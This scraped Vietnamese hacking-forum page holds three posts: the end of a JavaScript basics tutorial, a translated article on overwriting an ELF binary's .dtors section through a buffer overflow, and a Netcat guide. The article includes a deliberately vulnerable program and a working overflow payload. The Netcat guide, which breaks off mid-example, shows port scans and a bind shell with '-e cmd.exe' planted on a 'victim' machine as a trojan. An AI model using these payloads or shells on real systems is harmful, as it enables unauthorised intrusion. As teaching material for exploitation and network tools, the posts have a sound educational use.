biểu thức và sau đó so sánh giá trị nhận được với các giá trị trong từng câu lệnh case. Ngay khi gặp giá trị phù hợp, mã lệnh sẽ được thực hiện và tiếp tục qua tất cả các câu lệnh case còn lại. Chúng ta sử dụng câu lệnh break để ngưng việc thực hiện câu lệnh hiện tại và chuyển sang thực hiện câu lệnh tiếp theo. Chúng ta cũng rất thường sử dụng câu lệnh default trong câu lệnh switch để thực hiện mã lệnh khi không có một câu lệnh case nào phù hợp.<br/><br/> Các giá trị của câu lệnh case có thể có một kiểu dữ liệu bất kỳ, chẳng hạn như số hoặc chuỗi. Chúng ta có thể sử dụng bao nhiêu câu lệnh case tùy ý.<br/><br/> Vd:<br/><br/> &lt;script type="text/javascript"&gt;<br/> //You will receive a different greeting based<br/> //on what day it is. Note that Sunday=0,<br/> //Monday=1, Tuesday=2, etc.<br/> var d=new Date()<br/> theDay=d.getDay()<br/> switch (theDay)<br/> {<br/> case 5:<br/> document.write("Finally Friday")<br/> break<br/> case 6:<br/> document.write("Super Saturday")<br/> break<br/> case 0:<br/> document.write("Sleepy Sunday")<br/> break<br/> default:<br/> document.write("I'm looking forward to this weekend!")<br/> }<br/> &lt;/script&gt;<br/> Toán tử điều kiện:<br/><br/> Cú pháp:<br/><br/> variablename=(condition)?value1:value2<br/> Ví dụ:<br/><br/> greeting=(visitor=="PRES")?"Dear President ":"Dear "<br/> Nếu biến visitor bằng PRES thì chuỗi "Dear President" sẽ được gán cho biến greeting, còn nếu biến visitor không bằng PRES thì chuỗi "Dear" sẽ được gán cho biến greeting.<br/><br/> <font color='darkblue'>Vòng lặp</font><br/><br/> - While<br/><br/> Vòng lặp while sẽ thực thi đoạn mã cho đến khi điều kiện vẫn còn đúng.<br/><br/> Cú pháp:<br/><br/> while (condition)<br/> {<br/> code to be executed<br/> }<br/><br/><br/><br/><br/> - do...While<br/><br/> Câu lệnh do...While sẽ thi hành khối lệnh ít nhất một lần và sau đó sẽ lặp lại cho đến khi nào điều kiện vẫn còn đúng.<br/><br/> Cú pháp:<br/><br/> do<br/> {<br/> code to be executed<br/> }<br/> while (condition)<br/><br/> - For<br/><br/> Vòng lặp For sẽ lặp lại việc thực thi khối lệnh theo số lần được chỉ định trước.<br/><br/> Cú pháp:<br/><br/> for (initialization; condition; increment)<br/> {<br/> code to be executed<br/> }<br/><br/><br/><br/> <font color='darkblue'><br/> Đối Tượng Array</font><br/><br/> Đối tượng mảng được dùng để chứa một tập các giá trị trong một biến cùng tên. Mỗi giá trị là một phần tử của mảng. Mảng cho phép chúng ta chứa và truy xuất các dữ liệu có liên quan.<br/><br/> Bạn có thể tạo một kiểu của đối tượng mảng với từ khóa "new". Ví dụ sau sẽ tạo ra 2 mảng có 3 phần tử:<br/><br/> var family_names=new Array(3)<br/> var family_names=new Array("Tove","Jani","Stale")<br/><br/> Bạn có thể truy nhập vào từng phần tử riêng biệt trong mảng bằng cách sử dụng tên mảng cùng với chỉ số của nó. Chỉ số bắt đầu bằng số 0.<br/><br/> Nếu bạn tạo ra một mảng chỉ có các tham số, bạn có thể gán dữ liệu vào từng phần tử của mảng như sau:<br/><br/> family_names[0]="Tove"<br/> family_names[1]="Jani"<br/> family_names[2]="Stale"<br/><br/> Và dữ liệu có thể lấy ra bằng cách dùng các chỉ số của các phần tử riêng biệt trong mảng mà bạn muốn:<br/><br/> mother=family_names[0]<br/> father=family_names[1]<br/><br/> mother và farther là hai biến mới được gán thành 2 tên là Tove và Jani.<br/><br/> Các thuộc tính và phương thức của đối tượng mảng được mổ tả dưới đây:<br/><br/> <font color='darkblue'>Đối tượng Boolean:</font><br/><br/> Đối tượng Boolean là một đối tượng bao ngòai cho một giá trị boolean và nó được dùng để chuyển một giá trị không phải boolean (non-boolean) thành giá trị boolean - hoặc đúng, hoặc sai.<br/><br/> vd:<br/><br/> Nếu một đối tượng boolean không có giá trị khởi tạo(giá trị ban đầu) hoặc nó bằng 0, null, "", NaN(Not A Number) thì giá trị khởi tạo của nó sẽ được gán là false. Đối tượng boolean chỉ nhận giá trị true khi giá trị khởi tạo là chuỗi, kể cả chuỗi "false" <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"><br/><br/> Ví dụ về đối tượng boolean với giá trị khởi tạo là false:<br/><br/> var b1=new Boolean()<br/> var b2=new Boolean(0)<br/> var b3=new Boolean(null)<br/> var b4=new Boolean("")<br/> var b5=new Boolean(false)<br/> var b6=new Boolean(NaN)<br/><br/> Ví dụ về đối tượng boolean với giá trị khởi tạo là true:<br/><br/> var b1=new Boolean(true)<br/> var b2=new Boolean("true")<br/> var b3=new Boolean("false")<br/> var b4=new Boolean("Richard")<br/><br/> <font color='darkblue'> Đối tượng Date:<br/> </font><br/> Đối tượng Date được sử dụng khi làm việc với kiểu ngày tháng hoặc thời gian.<br/><br/> Đây là cách tạo một trường hợp của đối tượng Date và gán nó cho biến "d":<br/><br/> var d = new Date()<br/><br/> Sau khi khai báo xong, bạn hoàn toàn có thể truy xuất vào tất cả các phương thức của đối tượng Date từ biến "d".<br/><br/> ví dụ, để trả về ngày hiện tại trong một tháng (từ 1 đến 31) của đối tượng Date, ta có phương thức:<br/><br/> d.getDate()<br/><br/> Đối tượng Date có các tham số sau:<br/><br/> new Date(milliseconds)<br/> new Date(dateString)<br/> new Date(yr_num, mo_num, day_num [, hr_num, min_num, sec_num, ms_num])<br/><br/><br/> Nếu bạn chỉ sử dụng Date(), JavaScript sẽ tạo ra một đối tượng có ngày tháng theo thời gian hiện tại của máy cục bộ.<br/><br/> var d=new Date("October 12, 1988 13:14:00")<br/> var d=new Date("October 12, 1988")<br/> var d=new Date(88,09,12,13,14,00)<br/> var d=new Date(88,09,12)<br/> var d=new Date(500)<br/><br/><br/> Các thuộc tính và phương thức của đối tượng Date().<br/><br/> <font color='darkblue'>Đối tượng Math</font><br/><br/> Đối tượng Math bao gồm tất cả các hàm và các hằng số toán học có sẵn. Bạn không cần phải tạo đối tượng Math trước khi dùng.<br/><br/> vd: chứa một số random nằm trong khoảng 0 và 1 trong biến "r_number" ta có hàm random():<br/><br/> r_number=Math.random()<br/><br/> Để làm tròn số 8,6 ta có hàm round():<br/><br/> r_number=Math.round(8.6)<br/><br/><br/> Các thuộc tính và phương thức của đối tượng Math được mô tả ở đây:<br/><br/> Chuỗi(String): được sử dụng để làm việc với các đoạn văn bản<br/><br/> Các bạn hãy cẩn thận với các thuộc tính và các phương thức của String vì nó được dùng rất nhiều và tương đối quan trọng trong JavaScript.<br/><br/> Ngoài ra bạn có thể xem thêm ví dụ ở <span class="link"> http://consinat.com/ebook/Javascript.rar</span><br/><br/> Mulan</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/158.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/158/549.html#549,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Overwriting the .dtors section by Juan M. Bello Rivas<br/> Dịch sang tiếng Việt: SeekZero<br/> -------------------------------------------------------------------------------<br/><br/><br/> Giới thiệu<br/> ----------<br/><br/> Bài viết này trình bày một cách ngắn gọn một kỹ thuật dùng để chiếm quyền điều<br/> khiển và đổi hướng thực thi của một chương trình C được biên dịch bằng gcc.<br/> Người đọc xem như đã quen thuộc với kỹ thuật tràn bộ đệm cơ bản và định dạng<br/> ELF.<br/><br/><br/> Tổng quan<br/> ---------<br/><br/> gcc cung cấp một số kiểu thuộc tính (attributes) cho hàm, đặc biệt hai trong<br/> số đó làm chúng ta quan tâm là: cấu tử (constructor) và huỷ tử (destructor).<br/> Các thuộc tính này phải được lập trình viên mô tả theo cách tương tự như sau:<br/><br/> static void start(void) __attribute__ ((constructor));<br/> static void stop(void) __attribute__ ((destructor));<br/><br/> Hàm với thuộc tính 'constructor' sẽ được thực thi trước hàm main(), trong khi<br/> các hàm được khai báo với thuộc tính 'destructor' sẽ được thực thi ngay sau<br/> hàm main().<br/><br/> Khi tạo các file thực thi dạng ELF, đặc điểm này sẽ được thể hiện trong hai<br/> vùng khác nhau là: .ctors và .dtors. Cả hai vùng sẽ có cách sắp xếp như sau:<br/><br/> 0xffffffff &lt;function address&gt; &lt;another function address&gt; ... 0x00000000<br/><br/> LƯU Ý: Nếu bạn muốn biết tường tận về điều này, bạn nên xem mã nguồn<br/> gcc-2.95.2/gcc/collect2.c.<br/><br/> Bắt đầu từ đây, có một số điểm cần quan tâm:<br/> * .ctors và .dtors sẽ được ánh xạ (map) vào không gian bộ nhớ của tiến<br/> trình thực thi và mặc định là vùng ghi được.<br/> * Các vùng này không bị xoá khi sử dụng lệnh strip(1) với file thực thi<br/> * Chúng ta không quan tâm người viết ra chương trình có tạo các hàm làm<br/> cấu tử hoặc huỷ tử hay không vì cả hai vùng này cũng đều tồn tại và được<br/> ánh xạ vào bộ nhớ.<br/><br/><br/> Khảo sát chi tiết<br/> -----------------<br/><br/> Chúng ta sẽ minh họa những gì đã đề cập ở trên.<br/><br/> $ cat &gt; yopta.c &lt;&lt;EOF<br/> #include &lt;stdio.h&gt;<br/> #include &lt;stdlib.h&gt;<br/><br/> static void start(void) __attribute__ ((constructor));<br/> static void stop(void) __attribute__ ((destructor));<br/><br/> int<br/> main(int argc, char *argv[])<br/> {<br/> printf("start == %p\n", start);<br/> printf("stop == %p\n", stop);<br/><br/> exit(EXIT_SUCCESS);<br/> }<br/><br/> void<br/> start(void)<br/> {<br/> printf("hello world!\n");<br/> }<br/><br/> void<br/> stop(void)<br/> {<br/> printf("goodbye world!\n");<br/> }<br/><br/> EOF<br/> $ gcc -o yopta yopta.c<br/> $ ./yopta<br/> hello world!<br/> start == 0x8048480<br/> stop == 0x80484a0<br/> goodbye world!<br/> $ objdump -h yopta<br/> .<br/> .<br/> .<br/> 14 .data 0000000c 08049558 08049558 00000558 2**2<br/> CONTENTS, ALLOC, LOAD, DATA<br/> 15 .eh_frame 00000004 08049564 08049564 00000564 2**2<br/> CONTENTS, ALLOC, LOAD, DATA<br/> 16 .ctors 0000000c 08049568 08049568 00000568 2**2<br/> CONTENTS, ALLOC, LOAD, DATA<br/> 17 .dtors 0000000c 08049574 08049574 00000574 2**2<br/> CONTENTS, ALLOC, LOAD, DATA<br/> 18 .got 00000024 08049580 08049580 00000580 2**2<br/> CONTENTS, ALLOC, LOAD, DATA<br/> .<br/> .<br/> .<br/> $ objdump -s -j .dtors yopta<br/><br/> yopta: file format elf32-i386<br/><br/> Contents of section .dtors:<br/> 8049574 ffffffff a0840408 00000000 ............<br/><br/> Ta thấy địa chỉ của hàm stop() được lưu trong .dtors như đã đề cập ở trên. Mục<br/> đích của chúng ta là khai thác chương trình vì vậy từ đây chúng ta sẽ không<br/> quan tâm đến .ctors vì nó thực sự không có ích lợi gì cả.<br/><br/> Chúng ta sẽ thử một chương trình bình thường không có các hàm thuộc tính này<br/> (được khai báo tường minh):<br/><br/> $ cat &gt; bleh.c &lt;&lt;EOF<br/> #include &lt;stdio.h&gt;<br/> #include &lt;stdlib.h&gt;<br/> #include &lt;sys/types.h&gt;<br/><br/> static void bleh(void);<br/><br/> int<br/> main(int argc, char *argv[])<br/> {<br/> static u_char buf[] = "bleh";<br/><br/> if (argc &lt; 2)<br/> exit(EXIT_FAILURE);<br/><br/> strcpy(buf, argv[1]);<br/><br/> exit(EXIT_SUCCESS);<br/> }<br/><br/> void<br/> bleh(void)<br/> {<br/> printf("goffio!\n");<br/> }<br/> EOF<br/> $ gcc -o bleh bleh.c<br/> $ ./bleh<br/> $ objdump -h bleh<br/> .<br/> .<br/> .<br/> 17 .dtors 00000008 0804955c 0804955c 0000055c 2**2<br/> CONTENTS, ALLOC, LOAD, DATA<br/> .<br/> .<br/> .<br/><br/> Tốt! .dtors vẫn còn đó dù không có hàm huỷ tử nào được khai báo. Hãy xem nội<br/> dung của nó:<br/><br/> $ objdump -s -j .dtors bleh<br/><br/> bleh: file format elf32-i386<br/><br/> Contents of section .dtors:<br/> 804955c ffffffff 00000000 ........<br/><br/> Chỉ có các tag bắt đầu và kết thúc, không có địa chỉ hàm nào được mô tả ở đây.<br/><br/> Có thể thấy là hơi kỳ quặc khi ở trên ta khai báo biến "buf" vừa là static lại<br/> vừa được khởi trị. Bằng cách này chúng ta sẽ làm buf được lưu trong vùng<br/> .data, rất gần với vùng .dtors ta đang nhắm tới. Nhờ đó chúng ta có thể đạt<br/> được mục đích dễ dàng bằng cách làm tràn bộ đệm buf. Đây không phải là con<br/> đường duy nhất để ghi lên vùng .dtors, gần như mọi cách bạn có thể thực hiện<br/> để ghi lên không gian bộ nhớ của tiến trình đều dùng được (tấn công bằng định<br/> dạng chuỗi, strcpy trực tiếp bằng cách trở về hàm libc, làm hỏng malloc chunk,<br/> ...). Cách được chọn sử dụng ở đây là một cách đơn giản nhằm để minh hoạ.<br/><br/> Mục tiêu bây giờ là làm thế nào có thể thực thi đoạn mã trong hàm bleh() (sẽ<br/> không bao giờ được gọi trong điều kiện bình thường) bằng cách tạo một entry<br/> trong .dtors trỏ đến nó. Để đạt được điều đó chúng ta sẽ không đụng đến tag<br/> bắt đầu và chỉ ghi đè lên tag kết thúc (0x00000000).<br/><br/> $ objdump --syms bleh | egrep 'text.*bleh'<br/> 080484b0 l F .text 0000001a bleh<br/><br/> Có thể thấy hàm bleh() có địa chỉ 0x080484b0. Hãy bắt đầu khai thác lỗ hổng:<br/><br/> $ ./bleh `perl -e 'print "A" x 24; print "\xb0\x84\x04\x08";'`<br/> goffio!<br/> Segmentation fault (core dumped)<br/><br/> Thử nghiệm đã thành công như chúng ta mong đợi, nhưng có lẽ tốt hơn là nên xem<br/> xét kỹ lưỡng core do tiến trình tạo ra và xem những gì đã bị thay đổi.<br/><br/> $ gdb bleh core<br/> GNU gdb 5.0<br/> Copyright 2000 Free Software Foundation, Inc.<br/> GDB is free software, covered by the GNU General Public License, and you are<br/> welcome to change it and/or distribute copies of it under certain conditions.<br/> Type "show copying" to see the conditions.<br/> There is absolutely no warranty for GDB. Type "show warranty" for details.<br/> This GDB was configured as "i686-pc-linux-gnu"...<br/> Core was generated by `./bleh AAAAAAAAAAAAAAAAAAAAAAAA°<br/> '.<br/> Program terminated with signal 11, Segmentation fault.<br/> Reading symbols from /lib/libc.so.6...done.<br/> Loaded symbols for /lib/libc.so.6<br/> Reading symbols from /lib/ld-linux.so.2...done.<br/> Loaded symbols for /lib/ld-linux.so.2<br/> #0 0x40013ed8 in ?? ()<br/> (gdb) bt<br/> #0 0x40013ed8 in ?? ()<br/> #1 0x8048521 in _fini ()<br/> #2 0x4003c25a in exit (status=0) at exit.c:57<br/> #3 0x80484a3 in main ()<br/> #4 0x400339cb in __libc_start_main (main=0x8048460 &lt;main&gt;, argc=2,<br/> argv=0xbffff8a4, init=0x80482e0 &lt;_init&gt;, fini=0x804850c &lt;_fini&gt;,<br/> rtld_fini=0x4000ae60 &lt;_dl_fini&gt;, stack_end=0xbffff8<br/> 9c) at ../sysdeps/generic/libc-start.c:92<br/> (gdb) maintenance info sections<br/> Exec file:<br/> `/home/rwx/tmp/bleh', file type elf32-i386.<br/> .<br/> .<br/> .<br/> 0x0804953c-&gt;0x08049550 at 0x0000053c: .data ALLOC LOAD DATA HAS_CONTENTS<br/> 0x08049550-&gt;0x08049554 at 0x00000550: .eh_frame ALLOC LOAD DATA HAS_CONTENTS<br/> 0x08049554-&gt;0x0804955c at 0x00000554: .ctors ALLOC LOAD DATA HAS_CONTENTS<br/> 0x0804955c-&gt;0x08049564 at 0x0000055c: .dtors ALLOC LOAD DATA HAS_CONTENTS<br/> 0x08049564-&gt;0x0804958c at 0x00000564: .got ALLOC LOAD DATA HAS_CONTENTS<br/> .<br/> .<br/> .<br/><br/> Chúng ta sẽ xem xét những gì đã bị ghi đè<br/><br/> (gdb) x/x 0x08049550<br/> 0x8049550 &lt;force_to_data&gt;: 0x41414141<br/><br/> Đây là nội dung của vùng .eh_frame (gcc sử dụng để lưu các con trỏ xử lý biệt<br/> lệ (exception) cho các ngôn ngữ có hỗ trợ chúng)<br/><br/> (gdb) x/x 0x08049554<br/> 0x8049554 &lt;__CTOR_LIST__&gt;: 0x41414141<br/> (gdb) x/8x 0x0804955c<br/> 0x804955c &lt;__DTOR_LIST__&gt;: 0x41414141 0x080484b0 0x08049500<br/> 0x40013ed0<br/> 0x804956c &lt;_GLOBAL_OFFSET_TABLE_+8&gt;: 0x4000a960 0x400fb550 0x08048<br/> 336 0x400338cc<br/> (gdb)<br/><br/> Như đã thấy, chúng ta không quan tâm đặt tag bắt đầu 0xfffffff ở vị trí tương<br/> ứng của nó và điều đó hoàn toàn không cần thiết, chỉ cần đặt địa chỉ của<br/> bleh() vào đúng chỗ, chúng ta sẽ làm đoạn mã được thực thi. Cũng lưu ý rằng<br/> tiến trình bị segfault ngay sau _fini(), điều này rõ ràng là do nó tiếp tục<br/> tìm đến tag kết thúc (0x00000000) - lúc này đã không còn tồn tại - và nhảy đến<br/> các địa chỉ kế tiếp ngay sau địa chỉ của bleh() (các địa chỉ này được xác định<br/> trong bảng GOT - Global Offset Table).<br/><br/><br/> Kết luận<br/> --------<br/><br/> Bài viết đã trình bày một cách khác để thực thi các đoạn shellcode được chèn<br/> vào chương trình. Kỹ thuật này có một số ưu điểm:<br/><br/> * Nếu file thực thi có thể đọc được, sẽ rất dễ để xác định chính xác vị<br/> trí chúng ta muốn ghi vào và trỏ đến đoạn shellcode, chỉ cần xem file<br/> thực thi dạng ELF và xác định vị trí của vùng .dtors là đủ. Trong trường<br/> hợp này tính tin cậy (khả năng thành công) của trình khai thác lỗi tăng<br/> lên đáng kể.<br/> * Đơn giản hơn so với các kỹ thuật khác như ghi đè một entry trong bảng<br/> GOT.<br/><br/> Và những nhược điểm:<br/><br/> * Chương trình bị lỗi phải được biên dịch và liên kết bằng GNU gcc<br/> * Trong một số trường hợp có thể gặp khó khăn để tìm một nơi để chứa<br/> shellcode cho đến khi chương trình thoát ra.<br/><br/> Have fun! <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"><br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/157.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/157/548.html#548,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Hướng dẫn sử dụng Netcat<br/> <font color='red'>1. Giới thiệu</font><br/> Netcat là một công cụ không thể thiếu được nếu bạn muốn hack một website nào đó. Vì vậy bạn cần biết một chút về Netcat<img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom"><br/> --------------------------------------------------------------------------------<br/><br/> <font color='red'>2. Biên dịch</font><br/> Đối với bản Netcat cho Linux, bạn phải biên dịch nó trước khi sử dụng.<br/><br/> - hiệu chỉnh file netcat.c bằng vi: vi netcat.c<br/> + tìm dòng res_init(); trong main() và thêm vào trước 2 dấu "/": // res_init();<br/> + thêm 2 dòng sau vào phần #define (nằm ở đầu file):<br/> #define GAPING_SECURITY_HOLE<br/> #define TELNET<br/> - biên dịch: make linux<br/> - chạy thử: ./nc -h<br/> - nếu bạn muốn chạy Netcat bằng nc thay cho ./nc, bạn chỉ cần hiệu chỉnh lại biến môi trường PATH trong file ~/.bashrc, thêm vào ":."<br/> PATH=/sbin:/usr/sbin:...:.<br/><br/> Bản Netcat cho Win không cần phải compile vì đã có sẵn file nhị phân nc.exe. Chỉ vậy giải nén và chạy là xong.<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> <font color='red'>3. Các tùy chọn của Netcat</font><br/> Netcat chạy ở chế độ dòng lệnh. Bạn chạy nc -h để biết các tham số:<br/><br/> C:\&gt;nc -h<br/> connect to somewhere: nc [-options] hostname port[s] [ports] ...<br/> listen for inbound: nc -l -p port [options] [hostname] [port]<br/> options:<br/> -d detach from console, stealth mode<br/><br/> -e prog inbound program to exec [dangerous!!]<br/> -g gateway source-routing hop point[s], up to 8<br/> -G num source-routing pointer: 4, 8, 12, ...<br/> -h this cruft<br/> -i secs delay interval for lines sent, ports scanned<br/> -l listen mode, for inbound connects<br/> -L listen harder, re-listen on socket close<br/> -n numeric-only IP addresses, no DNS<br/> -o file hex dump of traffic<br/> -p port local port number<br/> -r randomize local and remote ports<br/> -s addr local source address<br/> -t answer TELNET negotiation<br/> -u UDP mode<br/> -v verbose [use twice to be more verbose]<br/> -w secs timeout for connects and final net reads<br/> -z zero-I/O mode [used for scanning]<br/> port numbers can be individual or ranges: m-n [inclusive]<br/><br/><br/> * Cú pháp:<br/><br/> - chế độ kết nối : nc [-tùy_chọn] tên_máy cổng1[-cổng2]<br/> - chế độ lắng nghe: nc -l -p cổng [-tùy_chọn] [tên_máy] [cổng]<br/><br/> * Một số tùy chọn:<br/><br/> -d tách Netcat khỏi cửa sổ lệnh hay là console, Netcat sẽ chạy ở chế độ steath(không hiển thị trên thanh Taskbar)<br/> -e prog thi hành chương trình prog, thường dùng trong chế độ lắng nghe<br/> -h gọi hướng dẫn<br/> -i secs trì hoãn secs mili giây trước khi gởi một dòng dữ liệu đi<br/> -l đặt Netcat vào chế độ lắng nghe để chờ các kết nối đến<br/> -L buộc Netcat "cố" lắng nghe. Nó sẽ lắng nghe trở lại sau mỗi khi ngắt một kết nối.<br/> -n chỉ dùng địa chỉ IP ở dạng số, chẳng hạn như 192.168.16.7, Netcat sẽ không thẩm vấn DNS<br/> -o file ghi nhật kí vào file<br/> -p port chỉ định cổng port<br/> -r yêu cầu Netcat chọn cổng ngẫu nhiên(random)<br/> -s addr giả mạo địa chỉ IP nguồn là addr<br/> -t không gởi các thông tin phụ đi trong một phiên telnet. Khi bạn telnet đến một telnet daemon(telnetd), telnetd thường yêu cầu trình telnet client của bạn gởi đến các thông tin phụ như biến môi trường TERM, USER. Nếu bạn sử dụng netcat với tùy chọn -t để telnet, netcat sẽ không gởi các thông tin này đến telnetd.<br/> -u dùng UDP(mặc định netcat dùng TCP)<br/> -v hiển thị chi tiết các thông tin về kết nối hiện tại. -vv sẽ hiển thị thông tin chi tiết hơn nữa.<br/> -w secs đặt thời gian timeout cho mỗi kết nối là secs mili giây<br/> -z chế độ zero I/O, thường được sử dụng khi scan port<br/><br/> Netcat hổ trợ phạm vi cho số hiệu cổng. Cú pháp là cổng1-cổng2. Ví dụ: 1-8080 nghĩa là 1,2,3,..,8080<br/><br/><br/> --------------------------------------------------------------------------------<br/><br/> <font color='red'>4. Các ví dụ:</font><br/> 4.1 Chộp banner của web server<br/> Ví dụ: nc đến 172.16.84.2, cổng 80<br/><br/> C:\&gt;nc 172.16.84.2 80<br/> HEAD / HTTP/1.0 (tại đây bạn gõ Enter 2 lần)<br/><br/> HTTP/1.1 200 OK<br/> Date: Sat, 05 Feb 2000 20:51:37 GMT<br/> Server: Apache-AdvancedExtranetServer/1.3.19 (Linux-Mandrake/3mdk) mod_ssl/2.8.2<br/> OpenSSL/0.9.6 PHP/4.0.4pl1<br/> Connection: close<br/> Content-Type: text/html<br/><br/><br/> Để biết thông tin chi tiết về kết nối, bạn có thể dùng -v(-vv sẽ cho biết các thông tin chi tiết hơn nữa)<br/><br/> C:\&gt;nc -vv 172.16.84.1 80<br/> 172.16.84.1: inverse host lookup failed: h_errno 11004: NO_DATA<br/> (UNKNOWN) [172.16.84.1] 80 (?) open<br/> HEAD / HTTP/1.0<br/><br/> HTTP/1.1 200 OK<br/> Date: Fri, 04 Feb 2000 14:46:43 GMT<br/> Server: Apache/1.3.20 (Win32)<br/> Last-Modified: Thu, 03 Feb 2000 20:54:02 GMT<br/> ETag: "0-cec-3899eaea"<br/> Accept-Ranges: bytes<br/> Content-Length: 3308<br/> Connection: close<br/> Content-Type: text/html<br/><br/> sent 17, rcvd 245: NOTSOCK<br/><br/><br/> Nếu muốn ghi nhật kí, hãy dùng -o &lt;tên_file&gt;. Ví dụ:<br/><br/> nc -vv -o nhat_ki.log 172.16.84.2 80<br/><br/><br/> - xem file nhat_ki.log<br/><br/> &lt; 00000000 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d # HTTP/1.1 200 OK.<br/> &lt; 00000010 0a 44 61 74 65 3a 20 46 72 69 2c 20 30 34 20 46 # .Date: Fri, 04 F<br/> &lt; 00000020 65 62 20 32 30 30 30 20 31 34 3a 35 30 3a 35 34 # eb 2000 14:50:54<br/> &lt; 00000030 20 47 4d 54 0d 0a 53 65 72 76 65 72 3a 20 41 70 # GMT..Server: Ap<br/> &lt; 00000040 61 63 68 65 2f 31 2e 33 2e 32 30 20 28 57 69 6e # ache/1.3.20 (Win<br/> &lt; 00000050 33 32 29 0d 0a 4c 61 73 74 2d 4d 6f 64 69 66 69 # 32)..Last-Modifi<br/> &lt; 00000060 65 64 3a 20 54 68 75 2c 20 30 33 20 46 65 62 20 # ed: Thu, 03 Feb<br/> &lt; 00000070 32 30 30 30 20 32 30 3a 35 34 3a 30 32 20 47 4d # 2000 20:54:02 GM<br/> &lt; 00000080 54 0d 0a 45 54 61 67 3a 20 22 30 2d 63 65 63 2d # T..ETag: "0-cec-<br/> &lt; 00000090 33 38 39 39 65 61 65 61 22 0d 0a 41 63 63 65 70 # 3899eaea"..Accep<br/> &lt; 000000a0 74 2d 52 61 6e 67 65 73 3a 20 62 79 74 65 73 0d # t-Ranges: bytes.<br/> &lt; 000000b0 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68 3a # .Content-Length:<br/> &lt; 000000c0 20 33 33 30 38 0d 0a 43 6f 6e 6e 65 63 74 69 6f # 3308..Connectio<br/> &lt; 000000d0 6e 3a 20 63 6c 6f 73 65 0d 0a 43 6f 6e 74 65 6e # n: close..Conten<br/> &lt; 000000e0 74 2d 54 79 70 65 3a 20 74 65 78 74 2f 68 74 6d # t-Type: text/htm<br/> &lt; 000000f0 6c 0d 0a 0d 0a # l....<br/><br/> dấu &lt; nghĩa là server gởi đến netcat<br/> dấu &gt; nghĩa là netcat gởi đến server<br/><br/> <font color='red'>4.2 Quét cổng</font><br/> - chạy netcat với tùy chọn -z. Để quét cổng nhanh hơn, hãy dùng -n vì netcat sẽ không cần thấm vấn DNS. Ví dụ để scan các cổng TCP(1-&gt;500) của host 172.16.106.1<br/><br/> [dt@vicki /]# nc -nvv -z 172.16.106.1 1-500<br/> (UNKNOWN) [172.16.106.1] 443 (?) open<br/> (UNKNOWN) [172.16.106.1] 139 (?) open<br/> (UNKNOWN) [172.16.106.1] 111 (?) open<br/> (UNKNOWN) [172.16.106.1] 80 (?) open<br/> (UNKNOWN) [172.16.106.1] 23 (?) open<br/><br/><br/> - nếu bạn cần scan các cổng UDP, dùng -u<br/><br/> [dt@vicki /]# nc -u -nvv -z 172.16.106.1 1-500<br/> (UNKNOWN) [172.16.106.1] 1025 (?) open<br/> (UNKNOWN) [172.16.106.1] 1024 (?) open<br/> (UNKNOWN) [172.16.106.1] 138 (?) open<br/> (UNKNOWN) [172.16.106.1] 137 (?) open<br/> (UNKNOWN) [172.16.106.1] 123 (?) open<br/> (UNKNOWN) [172.16.106.1] 111 (?) open<br/><br/><br/> <font color='red'>4.3 Biến Netcat thành một trojan</font><br/> - trên máy tính của nạn nhân, bạn khởi động netcat vào chế độ lắng nghe, dùng tùy chọn -l(listen) và -p port để xác định số hiệu cổng cần lắng nghe, -e &lt;tên_chương_trình_cần_chạy&gt; để yêu cầu netcat thi hành 1 chương trình khi có 1 kết nối đến, thường là shell lệnh cmd.exe(đối với NT) hoặc /bin/sh(đối với Unix). Ví dụ:<br/><br/> E:\&gt;nc -nvv -l -p 8080 -e cmd.exe<br/> listening on [any] 8080 ...<br/> connect to [172.16.84.1] from (UNKNOWN) [172.16.84.1] 3159<br/> sent 0, rcvd 0: unknown socket error<br/><br/><br/> - trên máy tính dùng để tấn công, bạn chỉ việc dùng netcat nối đến máy nạn nhân trên cổng đã định, chẳng hạn như 8080<br/><br/> C:\&gt;nc -nvv 172.16.84.2 8080<br/> (UNKNOWN) [172.16.84.2] 8080 (?) open<br/> Microsoft Windows 2000 [Version 5.00.2195]<br/> (C) Copyright 1985-1999 Microsoft Corp.<br/><br/> E:\&gt;cd test<br/> cd test<br/><br/> E:\test&gt;dir /w<br/> dir /w<br/> Volume in drive E has no label.<br/> Volume Serial Number is B465-452F<br/><br/> Directory of E:\test<br/><br/> [.] [..] head.log NETUSERS.EXE NetView.exe<br/> 